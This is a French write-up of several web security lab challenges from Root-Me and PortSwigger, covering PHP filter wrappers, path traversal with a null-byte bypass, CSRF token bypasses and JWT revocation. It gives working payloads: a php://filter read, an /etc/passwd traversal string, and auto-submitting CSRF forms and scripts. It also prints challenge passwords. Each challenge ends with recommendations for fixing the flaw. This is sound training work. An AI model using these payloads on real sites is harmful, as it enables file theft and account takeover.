# Challenges

## PHP - Filters

[https://www.root-me.org/fr/Challenges/Web-Serveur/PHP-Filters](https://www.root-me.org/fr/Challenges/Web-Serveur/PHP-Filters)

### Étapes

1. Sur la page d'accueil, dans l'url, ajouter un filtre: `?inc=php://filter/convert.base64-encode/resource=index.php`
2. Changer le nom du fichier par celui qu'on veut récupérer (index.php, ch12.php, config.php...)

<img src="images/php-filters.png" alt="php-filters" width="800"/>

Contenu du fichier :
```php
<?php
$username="admin";
$password="DAPt9D2mky0APAF";
```

Ressources : [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md#wrapper-phpfilter](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md#wrapper-phpfilter)

### Explication

PHP Filters permet de manipuler le contenu des fichiers lus via des flux (streams) en appliquant des filtres.
Ici, le filtre `convert.base64-encode` encode le contenu du fichier en base64, permettant de lire des fichiers sensibles.

### Recommandations

- Désactiver les wrappers PHP non nécessaires
- Valider et assainir les entrées utilisateur utilisées dans les chemins de fichiers

[https://www.php.net/manual/en/filters.convert.php](https://www.php.net/manual/en/filters.convert.php)

<br />
<hr style="height:0; border:1px white solid;" />
<br />

## File path traversal, validation of file extension with null byte bypass

[https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass)

### Étapes

1. Aller sur la page détail, mettre burp en intercept, envoyer la requete d'image vers le repeater
2. Changer le chemin par ../../../../etc/passwd

> Attention, comme le precise l'exercice, le serveur fait attention a l'extension, donc rajouter %00.jpg

<img src="images/path-traversal.png" alt="path-traversal" width="800"/>

### Explication

Le site vérifie uniquement l'extension, et ne contrôle pas qu'on sort du dossier du site.

### Recommandations

- Empêcher de pouvoir charger des fichiers hors du dossier du site
- Contrôler les caractères nul (%00, \x00)
- Vérifier le mime-type du fichier chargé, pas uniquement l'extension

[https://www.cve.org/CVERecord?id=CVE-2002-1031](https://www.cve.org/CVERecord?id=CVE-2002-1031)
[https://www.cve.org/CVERecord?id=CVE-2000-0149](https://www.cve.org/CVERecord?id=CVE-2000-0149)

<br />
<hr style="height:0; border:1px white solid;" />
<br />

## CSRF - Contournement de jeton

[https://www.root-me.org/fr/Challenges/Web-Client/CSRF-contournement-de-jeton](https://www.root-me.org/fr/Challenges/Web-Client/CSRF-contournement-de-jeton)

### Étapes

1. S'inscrire (test@test.fr / test)
2. Se login
3. Aller sur profile et récupérer les champs du formulaire
4. Aller sur contact
5. Mettre cette payload dans le form de contact:

```html
<script>
    const xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://challenge01.root-me.org/web-client/ch23/index.php?action=profile', false);
    xhr.send();
    const token = (xhr.responseText.match(/[abcdef0123456789]{32}/))[0];
    console.log(token);

    const formData = new FormData();
    formData.append('username', 'maxim');
    formData.append('status', 'on');
    formData.append('token', token);

    xhr.open('POST', 'http://challenge01.root-me.org/web-client/ch23/index.php?action=profile', false);
    xhr.send(formData);
</script>
```

<img src="images/csrf-form.png" alt="csrf-form" width="800"/>

La payload va chercher le token de l'admin sur son profil quand il sera connecté et autorise le user.
Mdp : DAPt9D2mky0APAF

### Explication

Le token CSRF est prévisible et peut être récupéré via une requête AJAX.
L'attaque CSRF est alors possible en incluant ce token dans la requête malveillante.

### Recommandations

- Ne pas exposer les tokens CSRF dans le code client
- Utiliser des tokens CSRF uniques par session
- Valider l'origine des requêtes via l'en-tête Referer ou Origin

[https://owasp.org/www-community/attacks/csrf](https://owasp.org/www-community/attacks/csrf)

<br />
<hr style="height:0; border:1px white solid;" />
<br />

## CSRF where token is not tied to user session

[https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session)

### Étapes

1. Se connecter et regarder le formulaire
2. Aller sur "le serveur d'exploit" (bouton en haut de la page)

Le chall indique : "csrf token non lié à l'utilisateur"
Chaque fois qu'on recharge la page, le token change => supposition : le token est généré par le serveur, il doit avoir un usage unique, et peut-être une date de validité

3. On copie le formulaire :

```html
<form class="login-form" name="emailForm" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="">
    <input required type="hidden" name="csrf" value="[le token présent]">
    <button class='button' type='submit'> Update email </button>
</form>
```

4. On le colle dans l'exploit, on rajoute bien l'url dans l'action (ex:https://0abf00c40352c27b813d03a0009b00b0.web-security-academy.net/), on change l'email et on rajoute un script pour l'envoyer automatiquement.

```html
<form class="login-form" name="emailForm" action="https://0abf00c40352c27b813d03a0009b00b0.web-security-academy.net/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="test@taloche.com">
    <input required type="hidden" name="csrf" value="bX6lrxuhzwsPkzc4Y3dVUjLhZ7VY7Cht">
    <button class='button' type='submit'> Update email </button>
</form>

<script>
  document.emailForm.submit();
</script>
```

### Explication

Le token CSRF n'est pas lié à la session utilisateur, il peut être réutilisé par un attaquant pour effectuer des actions au nom de l'utilisateur.

### Recommandations

- Lier les tokens CSRF à la session utilisateur

<br />
<hr style="height:0; border:1px white solid;" />
<br />

## CSRF where Referer validation depends on header being present

[https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present)

### Étapes

1. Se connecter
2. Comme pour les autres challs CSRF, on copie le formulaire de changement d'email, en rajoutant un meta referer never.

```html
<meta name="referrer" content="never">

<form class="login-form" name="loginForm" action="https://0a650008049246378115432a00840003.web-security-academy.net/my-account/change-email" method="POST">
    <label>Email</label>
    <input required="" type="email" name="email" value="someEmail2@email.email">
    <button class="button" type="submit"> Update email </button>
</form>
<script>
  document.loginForm.submit();
</script>
```

### Explication

Le serveur valide la requête en se basant sur la présence de l'en-tête Referer.
Si l'en-tête est absent, la validation échoue, permettant à un attaquant de contourner la protection CSRF.

### Recommandations

- Ne pas se fier uniquement à la présence de l'en-tête Referer pour valider les requêtes

[https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses#validation-of-referer-depends-on-header-being-present] (https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses#validation-of-referer-depends-on-header-being-present)

## JWT - Jeton révoqué

[https://www.root-me.org/fr/Challenges/Web-Serveur/JWT-Jeton-revoque](https://www.root-me.org/fr/Challenges/Web-Serveur/JWT-Jeton-revoque)

### Étapes

1. Requête page d'accueil => repeater
2. POST /login, payload: `{"username":"admin","password":"admin"}` (fourni dans le code source) <br /><img src="images/jwt-get.png" alt="jwt-get" width="800"/>
3. GET /admin avec JWT de l'admin, message "Token is revoqued" <br /><img src="images/jwt-post.png" alt="jwt-post" width="800"/>
4. Et en ajoutant un "=" à la signature du token JWT, j'ai reçu le message de réussite. <br /><img src="images/jwt-flag.png" alt="jwt-flag" width="800"/>

### Explication

La vérification de signature tolère un JWT avec padding (=). La liste de révocation compare la chaîne brute, la version modifiée n’est pas reconnue comme révoquée.

### Recommandations

Strip les caractères de padding avant de vérifier les JWT [https://github.com/auth0/node-jws/issues/98](https://github.com/auth0/node-jws/issues/98)
